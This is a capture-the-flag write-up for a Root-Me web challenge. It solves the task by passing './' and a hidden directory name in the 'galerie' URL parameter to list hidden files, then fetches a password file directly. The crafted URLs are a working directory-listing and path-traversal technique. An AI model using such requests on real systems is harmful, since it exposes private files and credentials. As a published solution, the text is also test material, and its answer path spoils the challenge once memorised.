We want to find the hidden part of the photo gallery. (nothing strange here...)

We see that the pages are loaded thanks to an argument passed in the url:
```
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=SOME_DIRECTORY
```

Well, if we are lucky, this is not protected, and we can go to:

```
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./
```

which is the current directory. We see something that was hidden before, a **86hwnX2r** directory.

We continue our journey to

```
challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./86hwnX2r
```

We discover the password file:

```
challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./86hwnX2r/password.txt
```

Of course, this is not a directory, so the code will not work. But we discovered it, we can directly obtain it by going to:

```
http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt
```
